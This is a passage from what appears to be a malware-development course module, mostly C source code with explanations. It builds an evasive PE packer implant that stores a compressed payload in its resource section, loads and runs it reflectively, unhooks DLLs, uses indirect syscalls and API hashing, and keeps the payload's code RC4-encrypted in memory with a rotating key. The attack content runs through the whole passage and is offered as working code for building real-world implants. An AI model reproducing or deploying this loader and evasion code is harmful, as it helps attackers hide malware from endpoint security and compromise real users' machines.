			if (!g_WinAPI.pCreateTimerQueueTimer(&amp;g_hTimer, g_hTimerQueue, 
(WAITORTIMERCALLBACK)ObfuscationTimerCallback, NULL, EXEC_WAIT * 1000, 
0, 0)) {
				goto _FAILURE;
			}

			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}


_FAILURE:
	return EXCEPTION_CONTINUE_SEARCH;
}
</code></pre>
<h3>Using Critical Sections</h3>
<p>Critical Sections were first introduced in the <em>Utilizing Hardware Breakpoints For Hooking (1)</em>
 module and are used to ensure thread safety and synchronization when 
running a multi-threaded program. This is done by initializing a section
 of code that will only be executed by one thread at a time. In this 
module, critical sections will be used in the <code>Rc4EncryptDecrypt</code> function.</p>
<p><code>Rc4EncryptDecrypt</code> is executed from within the VEH function, <code>PeFluctuationVectoredExceptionHandler</code>, and <code>CreateTimerQueueTimer</code>'s
 callback function. Since the implementation will have no control over 
when exceptions are raised, it is advised to use critical sections from 
within <code>Rc4EncryptDecrypt</code> to avoid running it twice at the same time, once being as a callback function and the other from the VEH function.</p>
<p>The implementation will utilize the following WinAPIs while working with critical sections:</p>
<ul>
<li>
<p><code>InitializeCriticalSection</code> - Initializes a critical section object by populating a <code>CRITICAL_SECTION</code> structure.</p>
</li>
<li>
<p><code>EnterCriticalSection</code> - Enters a critical section, 
indicating that the calling thread wants to access a shared resource 
protected by the critical section.</p>
</li>
<li>
<p><code>LeaveCriticalSection</code> - Releases a critical section, indicating that the calling thread has finished accessing the shared resource.</p>
</li>
</ul>
<p><code>InitializeCriticalSection</code> will be called before the first execution of the <code>Rc4EncryptDecrypt</code> function. On the other hand, <code>EnterCriticalSection</code> will be invoked at the start of <code>Rc4EncryptDecrypt</code>, while <code>LeaveCriticalSection</code> will be called at the end of the function.</p>
<h3>Random RC4 Key Generator</h3>
<p>The current setup for our RC4 functions makes use of the same key for
 all encryption and decryption routines during the PE payload execution.
 This is a serious weakness and should be avoided by rotating the key. 
Therefore, the <code>Rc4EncryptDecrypt</code> function will undergo a 
modification to alter the key after a set number of invocations. Our 
updated function will modify the key after the 20th execution of the <code>Rc4EncryptDecrypt</code> function, meaning after being called 10 times for encryption and 10 times for decryption of the <code>.text</code> section of the PE payload.</p>
<p>Keep in mind that the RC4 key can only be changed when the data is 
decrypted because if the key were to change while data is still 
encrypted, the decryption process would then use a different key which 
would result in corrupted data resulting in a process crash. Therefore, 
in addition to having <code>Rc4EncryptDecrypt</code> monitor the number of invocations, it must also check if the PE payload's <code>.text</code>
 section is decrypted. If so, then it would execute the code to change 
the RC4 key. The steps below will outline exactly what the updated code 
will do to update the RC4 key.</p>
<ul>
<li>
<p>Increment the global variable <code>g_dwDataStatus</code>, which is used to determine the data's state (whether decrypted or encrypted).</p>
</li>
<li>
<p>Increment the global variable <code>g_dwCycleCounter</code>, which is used to track the number of times the <code>Rc4EncryptDecrypt</code> function has been called.</p>
</li>
<li>
<p>When data is decrypted, assign a new random value to the local variable <code>bSeed</code>. This variable will be utilized in the code for altering the RC4 key.</p>
</li>
<li>
<p>Whenever the value of <code>g_dwCycleCounter</code> equals the constant <code>KEY_CHANGE_CYCLE_NMBR</code>, and <code>g_dwDataStatus</code> equals <code>DATA_DECRYPTED</code>, the RC4 key will undergo XOR operations with random values retrieved from the PE itself.</p>
</li>
<li>
<p>After the key alteration, reset the global variable <code>g_dwCycleCounter</code>.</p>
</li>
<li>
<p>When <code>g_dwDataStatus</code> matches the constant <code>DATA_DECRYPTED</code>, reset the <code>g_dwDataStatus</code> as well.</p>
</li>
</ul>
<pre><code class="language-C">#define		RC4_KEY_SIZE			0x10	// 16 byte

// Data state:
#define		DATA_ENCRYPTED			0x01
#define		DATA_DECRYPTED			0x02

// The number of times "Rc4EncryptDecrypt" should be invoked before 
changing the key:
#define		KEY_CHANGE_CYCLE_NMBR		20				

// The initial Rc4 key:
BYTE		g_Rc4Key[RC4_KEY_SIZE]	= { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 
0x87, 0xEF, 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };

// Used to determine the state of the injected PE file in memory 
(encrypted or not):
DWORD		g_dwDataStatus			= 0x00;
// Used to determine when to change the rc4 key (when g_dwCycleCounter 
== KEY_CHANGE_CYCLE_NMBR):	
DWORD		g_dwCycleCounter		= 0x00;		


BOOL Rc4EncryptDecryptDemo(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN 
BOOL bDecrypt){

	BYTE	bSeed	= 0x00;

	// Increment the global counters:
	// This will help in determining the data state in memory (encrypted 
nor decrypted).
	g_dwDataStatus++;
	// When g_dwCycleCounter == KEY_CHANGE_CYCLE_NMBR, the rc4 key is 
changed
	g_dwCycleCounter++;

	// Set a new seed that can be used for the new rc4 key
	if (g_dwDataStatus == DATA_DECRYPTED) {
		bSeed = pBuffer[bSeed % 0xFF];
	}

	/*
		Encrypt / Decrypt
	*/
	
	// Change the rc4 key 
	if (g_dwCycleCounter &gt;= KEY_CHANGE_CYCLE_NMBR &amp;&amp; 
g_dwDataStatus == DATA_DECRYPTED) {
		// Fast algorithm to completely change the rc4 key
		for (int i = 0; i &lt; RC4_KEY_SIZE; i++) {

			if (i % 2 == 0x00)
				g_Rc4Key[i] = g_Rc4Key[i] ^ ((pBuffer[i] ^ bSeed) % 0xFF);
			else
				g_Rc4Key[i] = g_Rc4Key[i] ^ ((g_Rc4Key[0] ^ bSeed) % 0xFF);
		}

		// Reset the counter 
		g_dwCycleCounter = 0x00;
	}

	// Reset the counter 
	if (g_dwDataStatus == DATA_DECRYPTED)
		g_dwDataStatus = 0x00;

}
</code></pre>
<h4>The Complete Rc4EncryptDecrypt Function</h4>
<p>The <code>Rc4EncryptDecrypt</code> function is shown below after updating it to use critical sections and rotating the RC4 key after each 20th invocation.</p>
<pre><code class="language-C">BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, 
IN DWORD dwBufferLen, IN BOOL bDecrypt) {

	// Enter a critical section
	g_WinAPI.pEnterCriticalSection(&amp;g_CriticalSection);

	NTSTATUS	STATUS			= NULL;
	USTRING		uStrBuffer		= { .Buffer = pBuffer,  .Length = dwBufferLen,  
.MaximumLength = dwBufferLen };
	USTRING		uStrKey			= { .Buffer = g_Rc4Key, .Length = RC4_KEY_SIZE, 
.MaximumLength = RC4_KEY_SIZE };
	DWORD		dwOldProtection	= 0x00;
	PVOID		pTmpBuffer		= (PVOID)pBuffer;
	SIZE_T		sTmpBufferLen	= (SIZE_T)dwBufferLen;
	BYTE		bSeed			= 0x00;

	if (!pTmpBuffer || !sTmpBufferLen)
		return FALSE;

	// Change the target's memory permissions to RW to allow encrypting (it
 was RO)
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pTmpBuffer, &amp;sTmpBufferLen, PAGE_READWRITE, 
&amp;dwOldProtection))) {
		return FALSE;
	}
	

	// Increment the global counters:
	// This will help in determining the data state in memory.
	g_dwDataStatus++;
	// When g_dwCycleCounter == KEY_CHANGE_CYCLE_NMBR, the rc4 key is 
changed
	g_dwCycleCounter++;

	// Set a new seed that can be used for the new rc4 key
	if (g_dwDataStatus == DATA_DECRYPTED) {
		bSeed = pBuffer[bSeed % 0xFF];
	}

	// Encrypt/Decrypt input data
	if (!NT_SUCCESS((STATUS = g_WinAPI.pSystemFunction032(&amp;uStrBuffer, 
&amp;uStrKey))) != 0x0) {
		return FALSE;
	}

	// Change the rc4 key 
	if (g_dwCycleCounter &gt;= KEY_CHANGE_CYCLE_NMBR &amp;&amp; 
g_dwDataStatus == DATA_DECRYPTED) {
		// Fast algorithm to completely change the rc4 key
		for (int i = 0; i &lt; RC4_KEY_SIZE; i++) {

			if (i % 2 == 0x00)
				g_Rc4Key[i] = g_Rc4Key[i] ^ ((pBuffer[i] ^ bSeed) % 0xFF);
			else
				g_Rc4Key[i] = g_Rc4Key[i] ^ ((g_Rc4Key[0] ^ bSeed) % 0xFF);
		}

		// Reset the counter 
		g_dwCycleCounter = 0x00;
	}

	// Reset the counter 
	if (g_dwDataStatus == DATA_DECRYPTED)
		g_dwDataStatus = 0x00;

	// Change the memory permissions to RO/RX.
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pTmpBuffer, &amp;sTmpBufferLen, (bDecrypt == TRUE ? 
PAGE_EXECUTE_READ : PAGE_READONLY), &amp;dwOldProtection))) {
		return FALSE;
	}
	
	// Leave the critical section
	g_WinAPI.pLeaveCriticalSection(&amp;g_CriticalSection);

	return TRUE;
}
</code></pre>
<br>
<h3>The LocalPeExecAndFluctuate Function</h3>
<p>The <code>LocalPeExecAndFluctuate</code> function invokes most of the
 implementation's code. The main purpose of this function is to execute 
the PE payload and start PeFluctuation (i.e. memory encryption). 
Additionally, it also calls the <code>UnhookAllLoadedDlls</code> function after fixing the IAT to unhook the newly loaded DLL modules.</p>
<p><code>LocalPeExecAndFluctuate</code> is shown below where it accepts only one parameter, <code>pPeHdrs</code>, representing the pointer of an initialized <code>PE_HDRS</code> structure.</p>
<pre><code class="language-C">BOOL LocalPeExecAndFluctuate(IN PPE_HDRS 
pPeHdrs) {

	if (!pPeHdrs)
		return FALSE;

	NTSTATUS		STATUS			        = 0x00;
	PBYTE			pPeBaseAddress		    = NULL;
	SIZE_T			sPeSize			        = 
(SIZE_T)pPeHdrs-&gt;pImgNtHdrs-&gt;OptionalHeader.SizeOfImage;
	PVOID			pVectoredExptnHandler	= NULL,
				    pEntryPoint		        = NULL;
	DLLMAIN			pDllMain		        = NULL;
	MAIN			pMain			        = NULL;

	// Initialize a critical section (used in Rc4EncryptDecrypt)
	g_WinAPI.pInitializeCriticalSection(&amp;g_CriticalSection);

	// Allocate enough memory to hold the decompressed pe
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pPeBaseAddress, 0x00, &amp;sPeSize, MEM_RESERVE | MEM_COMMIT, 
PAGE_READWRITE))) {
		return FALSE;
	}

	// Calculate the entry point
	pEntryPoint = (PVOID)(pPeBaseAddress + 
pPeHdrs-&gt;pImgNtHdrs-&gt;OptionalHeader.AddressOfEntryPoint);

	// Move the pe's section to the allocated memory
	for (int i = 0; i &lt; 
pPeHdrs-&gt;pImgNtHdrs-&gt;FileHeader.NumberOfSections; i++) {
		Memcpy(
			(PVOID)(pPeBaseAddress + pPeHdrs-&gt;pImgSecHdr[i].VirtualAddress),
			(PVOID)((ULONG_PTR)pPeHdrs-&gt;pFileBuffer + 
pPeHdrs-&gt;pImgSecHdr[i].PointerToRawData),
			pPeHdrs-&gt;pImgSecHdr[i].SizeOfRawData
		);
	}

	// Set up the IAT
	if (!FixImportAddressTable(pPeHdrs-&gt;pEntryImportDataDir, 
pPeBaseAddress))
		return FALSE;

	// Fix relocation
	if (!FixReloc(pPeHdrs-&gt;pEntryBaseRelocDataDir, pPeBaseAddress, 
pPeHdrs-&gt;pImgNtHdrs-&gt;OptionalHeader.ImageBase))
		return FALSE;

	// Set memory permissions. The 'FixMemPermissions' function will 
initialize the 'g_uPeTextAddress' and 'g_sPeTextSize' global variables
	if (!FixMemPermissions(pPeBaseAddress, pPeHdrs-&gt;pImgNtHdrs, 
pPeHdrs-&gt;pImgSecHdr))
		return FALSE;

	if (!g_uPeTextAddress || !g_sPeTextSize)
		return FALSE;

	// Set up a VEH that will execute 'UnhookingVectoredExceptionHandler' 
if an exception is triggered while unhooking
	if (!(pVectoredExptnHandler = 
g_WinAPI.pAddVectoredExceptionHandler(0x01, 
UnhookingVectoredExceptionHandler))) {
		return FALSE;
	}
	
	// Unhooking loaded dlls
	UnhookAllLoadedDlls();

	// Removing the set VEH
	if (!g_WinAPI.pRemoveVectoredExceptionHandler(pVectoredExptnHandler)) {
		return FALSE;
	}

	// Resolve the PE's exception handlers if found
	if (pPeHdrs-&gt;pEntryExceptionDataDir-&gt;Size) {

		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFuncEntry = 
(PIMAGE_RUNTIME_FUNCTION_ENTRY)(pPeBaseAddress + 
pPeHdrs-&gt;pEntryExceptionDataDir-&gt;VirtualAddress);

		if (!g_WinAPI.pRtlAddFunctionTable(pImgRuntimeFuncEntry, 
(pPeHdrs-&gt;pEntryExceptionDataDir-&gt;Size / 
sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, pPeBaseAddress)) {
		}
	}

	// Set up a VEH that will run PeFluctuationVectoredExceptionHandler 
when an exception occurs while executing the PE
	if (!(pVectoredExptnHandler = 
g_WinAPI.pAddVectoredExceptionHandler(0x01, 
PeFluctuationVectoredExceptionHandler))) {
 		return FALSE;
	}


	// Flush instructions
	SET_SYSCALL(g_Nt.NtFlushInstructionCache);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), NULL, 0x00))) {
		return FALSE;
	}

	// Execute TLS callbacks if found
	if (pPeHdrs-&gt;pEntryTLSDataDir-&gt;Size) {

		PIMAGE_TLS_DIRECTORY		pImgTlsDirectory	= 
(PIMAGE_TLS_DIRECTORY)(pPeBaseAddress + 
pPeHdrs-&gt;pEntryTLSDataDir-&gt;VirtualAddress);
		PIMAGE_TLS_CALLBACK*		pImgTlsCallback		= 
(PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory-&gt;AddressOfCallBacks);

		for (; *pImgTlsCallback; pImgTlsCallback++)
			(*pImgTlsCallback)((LPVOID)pPeBaseAddress, DLL_PROCESS_ATTACH, NULL);
	}

	// Free 'pPeHdrs-&gt;pFileBuffer', which is the base address of the 
decompressed PE
	LocalFree(pPeHdrs-&gt;pFileBuffer);

	// Create a timer queue
	if (!(g_hTimerQueue = g_WinAPI.pCreateTimerQueue())) {
		return FALSE;
	}

	// Use the timer queue created to execute the 
'ObfuscationTimerCallback' callback function after 'EXEC_WAIT' seconds 
to encrypt memory at 'g_uPeTextAddress'
	if (!g_WinAPI.pCreateTimerQueueTimer(&amp;g_hTimer, g_hTimerQueue, 
(WAITORTIMERCALLBACK)ObfuscationTimerCallback, NULL, EXEC_WAIT * 1000, 
0, 0)) {
		return FALSE;
	}

	// Execute the EP
	if (pPeHdrs-&gt;bIsDLLFile &amp;&amp; (pDllMain = 
(DLLMAIN)pEntryPoint))
		return pDllMain((HINSTANCE)pPeBaseAddress, DLL_PROCESS_ATTACH, NULL);
	if ((pMain = (MAIN)pEntryPoint))
		return pMain();
}
</code></pre>
<br>
<h3>LZW Data Compression Algorithm</h3>
<p>To pack the PE payload within our implant, one can utilize any C <a href="https://en.wikipedia.org/wiki/Data_compression">data compression</a> implementation that is compatible with the Visual Studio compiler. For this implementation, the <a href="https://www.geeksforgeeks.org/lzw-lempel-ziv-welch-compression-technique/">LZW algorithm</a>
 will be used. Covering how the LZW algorithm works is out of the scope 
of this module, however, implementing the algorithm through the use of 
open-source code is discussed in the sections below.</p>
<h3>The Lzw-Eddy Repository</h3>
<p>Upon searching for a functional LZW implementation, the <a href="https://github.com/eloj/lzw-eddy">lzw-eddy</a>
 repository was found to be a bug-free project, in addition to being 
compatible with the Visual Studio compiler. The LZW compression 
algorithm was implemented in the <a href="https://github.com/eloj/lzw-eddy/blob/master/lzw.h">lzw.h</a> header file of the repository, where the functions <code>lzw_compress</code> and <code>lzw_decompress</code>
 are called to compress and decompress data respectively. Both of these 
functions accept 5 parameters and require prior initialization to these 
parameters. To make matters simpler, two new wrapper functions will be 
created <code>LzwCompressData</code> and <code>LzwDecompressData</code>.</p>
<h4>LzwCompressData Function</h4>
<p>The <code>LzwCompressData</code> function below uses <code>lzw_compress</code> after initializing its parameters to compressed input data. <code>LzwCompressData</code> returns <code>TRUE</code> if it succeeds in compressing the data. The function also accepts the following parameters:</p>
<ul>
<li>
<p><code>pRawData</code> - The base address of the plaintext data to compress.</p>
</li>
<li>
<p><code>sRawDataSize</code> - The size of the plaintext data to compress.</p>
</li>
<li>
<p><code>ppCompressedData</code> - A pointer to a <code>PBYTE</code> variable that will receive the base address of the compressed data.</p>
</li>
<li>
<p><code>psCompressedDataSize</code> - A pointer to a <code>SIZE_T</code> variable that will receive the size of the compressed data.</p>
</li>
</ul>
<pre><code class="language-C">BOOL LzwCompressData(IN PBYTE pRawData, IN SIZE_T sRawDataSize, OUT PBYTE* ppCompressedData, OUT PSIZE_T psCompressedDataSize) 
{
	struct		lzw_state*	pLzwState		= NULL;
	SSIZE_T				    ssResults		= 0x00, 
					        ssWritten		= 0x00;
	PBYTE				    pCompressed		= NULL;
	SIZE_T				    sAllocated		= sRawDataSize;

	// Initializing lzw_compress's parameter
	if (!(pLzwState = (struct lzw_state*)LocalAlloc(LPTR, sizeof(struct lzw_state)))) 
		goto _FUNC_CLEANUP;

	// Allocating memory for the compressed data
	if (!(pCompressed = LocalAlloc(LPTR, sAllocated)))
		goto _FUNC_CLEANUP;

	// Compressing the data using the 'lzw_compress' function 
	while ((ssResults = lzw_compress(pLzwState, pRawData, sRawDataSize, pCompressed, sAllocated)) &gt; 0x00) {
		if (ssWritten &gt; sRawDataSize) 
			goto _FUNC_CLEANUP;
		ssWritten += ssResults;
	}

	// Checking the return value
	if (ssResults &lt; 0x00) 
		goto _FUNC_CLEANUP;

	// Assigning the output parameters values
	*ppCompressedData	    = pCompressed;
	*psCompressedDataSize	= ssWritten;

_FUNC_CLEANUP:
	if (pLzwState)
		LocalFree(pLzwState);
	if (ssResults &lt; 0x00)
		LocalFree(pCompressed);
	return (*ppCompressedData &amp;&amp; *psCompressedDataSize) ? TRUE : FALSE;
}
</code></pre>
<h4>LzwDecompressData Function</h4>
<p>On the other hand, the <code>LzwDecompressData</code> function below uses <code>lzw_decompress</code> after initializing its parameters to decompress LZW compressed data. <code>LzwDecompressData</code> returns <code>TRUE</code> if it succeeds in decompressing the data. The function also accepts the following parameters:</p>
<ul>
<li>
<p><code>pCompressedData</code> - The base address of the LZW compressed data to decompress.</p>
</li>
<li>
<p><code>sCompressedDataSize</code> - The size of the compressed data.</p>
</li>
<li>
<p><code>ppRawData</code> - A pointer to a <code>PBYTE</code> variable that will receive the base address of the decompressed data.</p>
</li>
<li>
<p><code>psRawDataSize</code> - A pointer to a <code>SIZE_T</code> 
variable that will receive the size of the decompressed data. This 
parameter should be set to the original size of the data before 
compressing (<code>sRawDataSize</code> in <code>LzwCompressData</code>). Therefore, the <code>psRawDataSize</code> parameter should have the same value before and after the function execution.</p>
</li>
</ul>
<pre><code class="language-C">BOOL LzwDecompressData(IN PBYTE 
pCompressedData, IN SIZE_T sCompressedDataSize, OUT PBYTE* ppRawData, IN
 OUT PSIZE_T psRawDataSize)
{
	struct		lzw_state*	pLzwState		= NULL;
	SSIZE_T				    ssResults		= 0x00, 
					        ssWritten		= 0x00;
	PBYTE				    pRawData		= NULL;
	SIZE_T				    sAllocated		= *psRawDataSize;		 

	// Initializing lzw_decompress's parameter
	if (!(pLzwState = (struct lzw_state*)LocalAlloc(LPTR, sizeof(struct 
lzw_state)))) 
		goto _FUNC_CLEANUP;

	// Allocating memory for the decompressed data
	if (!(pRawData = LocalAlloc(LPTR, sAllocated))) 
		goto _FUNC_CLEANUP;

	// Decompressing the data using the 'lzw_decompress' function 
	while ((ssResults = lzw_decompress(pLzwState, pCompressedData, 
sCompressedDataSize, pRawData, sAllocated)) &gt; 0x00) {
		if (ssWritten &gt; *psRawDataSize) 
			goto _FUNC_CLEANUP;
		ssWritten += ssResults;
	}

	// Checking the return value
	if (ssResults &lt; 0x00) 
		goto _FUNC_CLEANUP;
	
	// Assigning the output parameters values
	*ppRawData	    = pRawData;
	*psRawDataSize	= ssWritten;

_FUNC_CLEANUP:
	if (pLzwState)
		LocalFree(pLzwState);
	if (ssResults &lt; 0x00)
		LocalFree(pRawData);
	return (*ppRawData &amp;&amp; *psRawDataSize) ? TRUE : FALSE;
}
</code></pre>
<h3>PeCompressor Program</h3>
<p>To pack the PE payload, the <code>PeCompressor.exe</code> program has been constructed. <code>PeCompressor.exe</code> will make use of the <code>LzwCompressData</code> function after reading a PE payload from the disk, then write the compressed data into a file named <code>PeFileCompressed.lzw</code>. This new file will be a part of the PE packer's implant where it will read it from its resource section.</p>
<p>It is worth noting that since the <code>LzwDecompressData</code> function requires the original size of the payload (before being compressed), the <code>PeCompressor.exe</code> program will write the initial payload size at the end of the <code>PeFileCompressed.lzw</code> file, which allows the PE packer to retrieve that value at runtime, and invoke the <code>LzwDecompressData</code> function with the right parameters. This trick is shown in the image below.</p>
<img width="800px" style="margin:auto" alt="image" src="31_files/pepacker-276522384-6958be7a-e87b-43a0-81a6-799f48e1fe5f.png">
<h3>Payload Placement</h3>
<p>As mentioned earlier, the PE packer will store the compressed version of the PE payload, <code>PeFileCompressed.lzw</code>,
 in its resource section. Storing a payload in the resource section of 
the implant was done multiple times across the course but was first 
implemented in the <em>Payload Placement - .rsrc Section</em> module.</p>
<h3>The GetDecompressedResourcePayload Function</h3>
<p>From the PE packer's perspective, to retrieve the PE payload in its plaintext version, the implant must undergo the steps below.</p>
<ol>
<li>
<p>Fetch the compressed payload from the resource section.</p>
</li>
<li>
<p>Retrieve the original size of the payload saved as the last 8 bytes at the end of the resource section.</p>
</li>
<li>
<p>Call the <code>LzwDecompressData</code> function to decompress the retrieved data.</p>
</li>
</ol>
<p>These steps are performed by the <code>GetDecompressedResourcePayload</code> function shown below which requires the following parameters:</p>
<ul>
<li>
<p><code>hModule</code> - A handle to the module from which the resource section payload should be retrieved.</p>
</li>
<li>
<p><code>wResourceId</code> - The resource ID associated with the payload, which was assigned during the creation of the resource section.</p>
</li>
<li>
<p><code>ppDecompressedPe</code> - A pointer to a <code>PBYTE</code> variable that will be set as the base address of the decompressed PE payload.</p>
</li>
<li>
<p><code>psDecompressedPeSize</code> - A pointer to a <code>SIZE</code> variable that will be set as the size of the decompressed PE payload.</p>
</li>
</ul>
<pre><code class="language-C">BOOL GetDecompressedResourcePayload(IN 
HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppDecompressedPe, OUT 
PSIZE_T psDecompressedPeSize) {

	PBYTE		pCompressedPe		= NULL;
	SIZE_T		sCompressedPeSize	= NULL;

	// Fetching packed PE from .rsrc section
	// Helper function - explained in the next section
	if (!GetResourceData(hModule, wResourceId, &amp;pCompressedPe, 
&amp;sCompressedPeSize)) {
		return FALSE;
	}

	// Retrieving the size of the raw PE
	*psDecompressedPeSize = *(PSIZE_T)(pCompressedPe + sCompressedPeSize - 
sizeof(SIZE_T));

	if (!(*ppDecompressedPe = LocalAlloc(LPTR, *psDecompressedPeSize))) 
		return FALSE;

	if (!LzwDecompressData(pCompressedPe, sCompressedPeSize, 
ppDecompressedPe, psDecompressedPeSize)) {
		LocalFree(*ppDecompressedPe);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h4>GetResourceData Helper Function</h4>
<p><code>GetDecompressedResourcePayload</code> makes use of a helper function, <code>GetResourceData</code>, which was used in earlier modules to retrieve data from the resource section without the need to call any of the <code>FindResource</code>, <code>LoadResource</code>, <code>LockResource</code>, or <code>SizeofResource</code> WinAPIs.</p>
<pre><code class="language-C">BOOL GetResourceData(IN HMODULE hModule, 
IN WORD ResourceId, OUT PVOID* ppResourceRawData, OUT PDWORD 
psResourceDataSize) {

	CHAR*                   pBaseAddr          = (CHAR*)hModule;
	PIMAGE_DOS_HEADER       pImgDosHdr         = 
(PIMAGE_DOS_HEADER)pBaseAddr;
	PIMAGE_NT_HEADERS       pImgNTHdr          = 
(PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr-&gt;e_lfanew);
	PIMAGE_OPTIONAL_HEADER  pImgOptionalHdr    = 
(PIMAGE_OPTIONAL_HEADER)&amp;pImgNTHdr-&gt;OptionalHeader;
	PIMAGE_DATA_DIRECTORY   pDataDir           = 
(PIMAGE_DATA_DIRECTORY)&amp;pImgOptionalHdr-
&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

	PIMAGE_RESOURCE_DIRECTORY               pResourceDir    = NULL, 
pResourceDir2    = NULL, pResourceDir3   = NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY         pResourceEntry  = NULL, 
pResourceEntry2  = NULL, pResourceEntry3 = NULL;
	PIMAGE_RESOURCE_DATA_ENTRY              pResource	= NULL;


	pResourceDir	= (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + 
pDataDir-&gt;VirtualAddress);
	pResourceEntry	= (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);

	for (DWORD i = 0; i &lt; (pResourceDir-&gt;NumberOfNamedEntries + 
pResourceDir-&gt;NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2	= (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + 
pDataDir-&gt;VirtualAddress + (pResourceEntry[i].OffsetToDirectory &amp;
 0x7FFFFFFF));
		pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 
1);

		if (pResourceEntry2-&gt;DataIsDirectory == 1 &amp;&amp; 
pResourceEntry2-&gt;Id == ResourceId) {

			pResourceDir3   = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + 
pDataDir-&gt;VirtualAddress + (pResourceEntry2-&gt;OffsetToDirectory 
&amp; 0x7FFFFFFF));
			pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 
1);
			pResource       = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + 
pDataDir-&gt;VirtualAddress + (pResourceEntry3-&gt;OffsetToData &amp; 
0x7FFFFFFF));

			*ppResourceRawData	= (PVOID)(pBaseAddr + 
(pResource-&gt;OffsetToData));
			*psResourceDataSize 	= pResource-&gt;Size;

			break;
		}

	}

	if (*ppResourceRawData != NULL &amp;&amp; *psResourceDataSize != NULL)
		return TRUE;

	return FALSE;
}
</code></pre>
<br>
<h3>The Main Function</h3>
<p>Once the implementation is completed, the main function should 
proceed to execute the following functions in the order provided below:</p>
<ul>
<li>
<p><code>InitIndirectSyscalls</code> - Initialize HellsHall indirect syscalls.</p>
</li>
<li>
<p><code>InitializeWinAPIs</code> - Initialize WinAPIs function pointers via API hashing.</p>
</li>
<li>
<p><code>GetDecompressedResourcePayload</code> - Fetch the compressed PE payload from the resource section and decompress it using the LZW algorithm.</p>
</li>
<li>
<p><code>InitializePeStruct</code> -  Initialize a <code>PE_HDRS</code> struct that will contain all the required information to execute the PE payload.</p>
</li>
<li>
<p><code>LocalPeExecAndFluctuate</code> - Execute the PE, unhook loaded DLLs, and perform PEFluctuation.</p>
</li>
</ul>
<h4>The AddWin32uToIat Function - Loading win32u.dll</h4>
<p>It is important to load the <code>win32u.dll</code> module before calling the <code>InitIndirectSyscalls</code> function, for its crucial rule in executing syscalls. In the <em>Building An Evasive DLL Payload Loader</em> module, <code>win32u.dll</code> was loaded by adding <code>shell32.dll</code> to the implant's IAT. <code>shell32.dll</code> loads <code>win32u.dll</code>, ensuring that the latter DLL is loaded. To add <code>shell32.dll</code> to the IAT, one can call any function that it exports, which is done in the following <code>AddWin32uToIat</code> function where <a href="https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetfolderpathw">SHGetFolderPathW</a> was used.</p>
<pre><code class="language-C">// This function loads win32u.dll into the IAT

VOID AddWin32uToIat() {
	WCHAR szPath[MAX_PATH] = { 0 };
	SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}
</code></pre>
<br>
<h3>CRT Library Function Replacement</h3>
<p>As done in multiple modules across the course, when building a 
real-world implant, it is advised to remove the CRT library by following
 the steps in the <em>CRT Library Removal &amp; Malware Compiling</em> 
module. As mentioned in the aforementioned module, when the CRT library 
is removed, certain functions will become unusable and will require a 
custom implementation. These custom functions have been re-created 
below.</p>
<h4>Replacing rand()</h4>
<p><code>rand</code> is replaced with <code>GenerateRandomInt</code>.</p>
<pre><code class="language-C">unsigned int GenerateRandomInt()  {
    static unsigned int state = 123456789;
    state ^= state &lt;&lt; 13;
    state ^= state &gt;&gt; 17;
    state ^= state &lt;&lt; 5;
    return state;
}
</code></pre>
<h3>Replacing wcscat()</h3>
<p><code>wcscat</code> is replaced with <code>Wcscat</code>.</p>
<pre><code class="language-C">VOID Wcscat(IN WCHAR* pDest, IN WCHAR* pSource) {
    while (*pDest != 0)
        pDest++;

    while (*pSource != 0) {
        *pDest = *pSource;
        pDest++;
        pSource++;
    }

    *pDest = 0;
}
</code></pre>
<h3>Replacing memcpy</h3>
<p><code>memcpy</code> is replaced with <code>Memcpy</code>.</p>
<pre><code class="language-C">VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength) {

    PBYTE D = (PBYTE)pDestination;
    PBYTE S = (PBYTE)pSource;

    while (sLength--)
        *D++ = *S++;
}
</code></pre>
<h3>Intrinsic Functions</h3>
<p>In addition to function replacements at runtime, the compiler required a custom declaration for the <code>memset</code> and <code>strrchr</code> functions, which is done via the <code>intrinsic</code> keyword. Again, this was explained and used in the same previously mentioned module.</p>
<pre><code class="language-C">// replaces 'memset' while compiling
extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- &gt; 0) {
        *p++ = (unsigned char)value;
    }
    return pTarget;
}


// replaces 'strrchr' while compiling. 
extern void* __cdecl strrchr(const char*, int);

#pragma intrinsic(strrchr)
#pragma function(strrchr)
char* strrchr(const char* str, int c) {
